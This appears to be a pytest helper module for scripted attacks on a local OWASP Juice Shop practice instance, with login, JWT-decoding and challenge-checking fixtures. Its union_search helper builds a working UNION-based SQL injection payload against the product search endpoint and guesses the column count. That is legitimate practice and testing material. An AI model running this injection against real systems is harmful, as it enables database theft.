"""Shared helpers for attacking a local OWASP Juice Shop.

Juice Shop (https://owasp.org/www-project-juice-shop/) is built to be
hacked for practice. Run it locally only: these attacks are for that app.
"""
from __future__ import annotations

import base64
import json
import os
import time

import pytest
import requests

BASE = os.environ.get("JUICE_SHOP_URL", "http://localhost:3000").rstrip("/")
# CI starts a fresh container, so every challenge must begin unsolved there.
FRESH = os.environ.get("JUICE_SHOP_FRESH") == "1"


class Shop:
    def __init__(self) -> None:
        self.http = requests.Session()

    def get(self, path: str, **kw) -> requests.Response:
        return self.http.get(BASE + path, timeout=30, **kw)

    def post(self, path: str, **kw) -> requests.Response:
        return self.http.post(BASE + path, timeout=30, **kw)

    def challenge_solved(self, name: str) -> bool:
        data = self.get("/api/Challenges/").json()["data"]
        matches = [c for c in data if c["name"] == name]
        assert matches, f"no challenge called {name!r} in this Juice Shop version"
        return bool(matches[0]["solved"])

    def login(self, email: str, password: str) -> requests.Response:
        return self.post("/rest/user/login", json={"email": email, "password": password})

    def token(self, email: str, password: str) -> str:
        response = self.login(email, password)
        assert response.status_code == 200, response.text
        return response.json()["authentication"]["token"]

    def captcha(self) -> dict:
        return self.get("/rest/captcha/").json()

    def new_user_token(self, email: str, password: str = "correct-horse-7") -> str:
        """Register an ordinary customer and sign in as them."""
        created = self.post("/api/Users/", json={"email": email, "password": password, "passwordRepeat": password})
        assert created.status_code == 201, created.text
        return self.token(email, password)

    def union_search(self, columns: str, table: str) -> requests.Response:
        """Run `UNION SELECT <columns>, padding... FROM <table>` through the product search.

        UNION needs the same number of columns as `SELECT * FROM Products`.
        Like a real attacker, try the likeliest count first, then nearby ones.
        Wrong guesses are SQL errors (HTTP 500)."""
        given = columns.count(",") + 1
        for total in (10, 9, 11, 8, 12):
            padding = "".join(f",{n}" for n in range(given + 1, total + 1))
            response = self.get("/rest/products/search", params={"q": f"qwert')) UNION SELECT {columns}{padding} FROM {table}--"})
            if response.status_code == 200:
                return response
        raise AssertionError("no column count between 8 and 12 worked for the UNION")


def jwt_claims(token: str) -> dict:
    payload = token.split(".")[1]
    return json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))


@pytest.fixture(scope="session")
def shop() -> Shop:
    s = Shop()
    for _ in range(120):
        try:
            if s.get("/rest/admin/application-version").status_code == 200:
                return s
        except requests.ConnectionError:
            pass
        time.sleep(1)
    pytest.exit(f"Juice Shop isn't answering at {BASE}", returncode=2)


@pytest.fixture
def solves(shop: Shop):
    """Use as: with solves("Login Admin"): <attack>. Checks the challenge goes
    from unsolved (on a fresh shop) to solved."""

    class _Solves:
        def __init__(self, name: str) -> None:
            self.name = name

        def __enter__(self):
            if FRESH:
                assert not shop.challenge_solved(self.name), f"{self.name} was solved before the attack"
            return self

        def __exit__(self, exc_type, *_):
            if exc_type is None:
                # Juice Shop marks challenges solved asynchronously; allow a moment.
                for _ in range(20):
                    if shop.challenge_solved(self.name):
                        return False
                    time.sleep(0.25)
                raise AssertionError(f"the attack ran, but Juice Shop doesn't count {self.name!r} as solved")
            return False

    return _Solves
